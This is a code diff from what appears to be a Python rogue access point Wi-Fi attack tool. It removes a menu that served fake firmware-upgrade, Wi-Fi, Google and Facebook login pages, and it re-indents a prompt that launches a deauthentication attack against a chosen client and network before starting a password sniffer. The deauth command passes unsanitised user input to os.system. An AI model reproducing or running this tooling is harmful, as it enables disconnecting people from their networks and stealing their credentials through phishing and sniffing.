@@ -65,31 +65,17 @@ def start(iface):
     elif ipforward == "off" or ipforward == "Off" or ipforward == "OFF":
         print("[*] IP forward unactivate")
         methods.ipforward_off()
-        print("\n\n[^] select page:\n[1] firmware upgrade\n[2] wifi login\n[3] google login\n[4] facebook login")
-        page = input("\n: ")
-        if page == "1":
-            methods.apache2(pwd+"/pages/firmware-upgrade.zip")
-        elif page == "2":
-            with open(pwd+"/pages/device/index.html", "r") as html:
-                code = html.read()
-                html.close()
-            code = code.replace("{{ target_ap_essid }}", essid)
-            methods.apache2(None, code)
-        elif page == "3":
-            methods.apache2(pwd+"/pages/google-login.zip")
-        elif page == "4":
-            methods.apache2(pwd+"/pages/facebook-login.zip")
 
-        dos = input("[^] send Deauth packet? yes/no # ")
-        if dos == "yes" or dos == "Yes" or dos == "YES":
-            clientmac = input("[^] (Client mac address[ff:ff:ff:ff:ff:ff])-> ")
-            if clientmac == "" or clientmac == " ":
-                print("[*] Set ff:ff:ff:ff:ff:ff Client mac address!")
-            wifimac = input("[^] (Wifi Bssid)-> ")
-            if wifimac == "" or wifimac == " ":
-                print("E...r")
-                sys.exit(1)
-            print("[*] Set {0} Wifi bssid!")
-            os.system("xterm -e python3 modules/Deauth.py {0} {1} {2}".format(clientmac, wifimac, iface))
+    dos = input("[^] send Deauth packet? yes/no # ")
+    if dos == "yes" or dos == "Yes" or dos == "YES":
+        clientmac = input("[^] (Client mac address[ff:ff:ff:ff:ff:ff])-> ")
+        if clientmac == "" or clientmac == " ":
+            print("[*] Set ff:ff:ff:ff:ff:ff Client mac address!")
+        wifimac = input("[^] (Wifi Bssid)-> ")
+        if wifimac == "" or wifimac == " ":
+            print("E...r")
+            sys.exit(1)
+        print("[*] Set {0} Wifi bssid!")
+        os.system("xterm -e python3 modules/Deauth.py {0} {1} {2}".format(clientmac, wifimac, iface))
 
-        passsniff.start()
+    passsniff.start()
